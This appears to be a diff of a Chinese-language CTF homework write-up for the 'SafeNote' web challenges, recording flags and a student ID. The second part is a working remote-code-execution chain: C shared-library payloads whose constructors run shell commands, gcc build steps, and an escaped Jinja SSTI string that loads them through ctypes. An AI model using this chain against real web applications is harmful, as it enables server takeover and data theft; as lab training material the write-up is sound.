@@ -1,16 +1,20 @@
 #Web 
 
+學號：`415551013`
 ## 題目 1
+- Flag： `CTF{unicode-to-bypass-path-check-ouo-qn1dwj}`
+---
 
 **Web - SafeNote #1**  
 
 此為題組，SafeNote 中共有兩把 flag。
 `http://chals1:21000/`
 
-點開網址，是一個名為 Safe Notes 的筆記網站，可以建立筆記並上傳附件。：![[HW1-1_web.png]]
-<div style="page-break-after: always;">-</div>
+點開網址，是一個名為 Safe Notes 的筆記網站，可以建立筆記並上傳附件：![[HW1-1_web.png]]
+<div style="page-break-after: always;"></div>
 
-## 解題
+---
+### 解題
 ##### 觀察
 1. 觀察網站發現 Title、Note 可以建立筆記，建完的筆記會在 Your notes 的列表上
 2. 嘗試建立筆記後，頁面提供 "草稿預覽" 和 "附件上傳" 兩個功能
@@ -83,7 +87,64 @@
 flag = `CTF{unicode-to-bypass-path-check-ouo-qn1dwj}`
 
 <div style="page-break-after: always;"></div>
-
+---
 ## 題目 2
+- Flag： `CTF{safe_notes_rce_0f1efdba}`
+---
+**Web - SafeNote #2**  
 
+此為題組，SafeNote 中共有兩把 flag。
 
+---
+### 解題
+##### 觀察
+從上一題已經拿到 `main.py`
+![[HW1-2_storage.png|635]]![[HW1-2_attachments.png|638]]
+-> 發現上傳的檔案儲存在 `/app/storage/attachments/`
+![[HW1-2_ctypes.png|507]]
+-> 使用 `ctypes`
+>[!abstract] ctypes
+>`ctypes` 可以在 Python 程序中載入 Linux 動態函式庫。
+>`ctypes.cdll` 可以透過屬性存取觸發函式庫載入
+
+-> <mark style="background: #FFF3A3A6;">上傳 ELF Shared Library，利用 SSTI 觸發 ctypes 載入</mark>
+
+<div style="page-break-after: always;"></div>
+
+##### RCE
+1. 建立 `payload.c`，依照提示 "flag 在根目錄"，先用指令列出根目錄
+	```c
+	#include <stdlib.h>
+	__attribute__((constructor))
+	static void run(void) {
+	    system("(id; ls -la /) > /app/storage/attachments/result.txt 2>&1");
+	}
+	```
+	>Linux 在載入動態函式庫（.so）時，會自動執行其中被標記為 constructor 的函式，`payload` 被連結時會自動執行 `run()`，並將結果存成 `result.txt`
+	
+	compile
+	```bash
+	gcc -shared -fPIC -o payload payload.c
+	```
+2. 上傳並觸發，在 Draft text 中輸入 `__init__.__globals__['os'].sys.modules['ctypes'].cdll` 的繞過版：
+	```bash
+	{{'{0\x2e\x5f\x5finit\x5f\x5f\x2e\x5f\x5fglobals\x5f\x5f[os]\x2esys\x2emodules[ctypes]\x2ecdll\x2e/app/storage/attachments/payload}'|attr('format')(cycler)}}
+	```
+	檢查 `attachments/preview?file=result.txt`
+	![[HW1-2_ls.png|382]]
+3. 查看 `flag-ae4e42ac.txt`
+   - 建立 `payload2.c`
+     ```c
+     #include <stdlib.h>
+	__attribute__((constructor))
+	static void run(void) {
+	    system("cat /flag-ae4e42ac.txt > /app/storage/attachments/flag_result.txt 2>&1");
+	}
+     ```
+     compile
+     ```bash
+     gcc -shared -fPIC -o payloadflag payload2.c
+     ```
+    - 上傳並檢查 `/attachments/preview?file=flag_result.txt`
+      ![[HW1-2_flag.png|353]]
+1. flag = `CTF{safe_notes_rce_0f1efdba}`
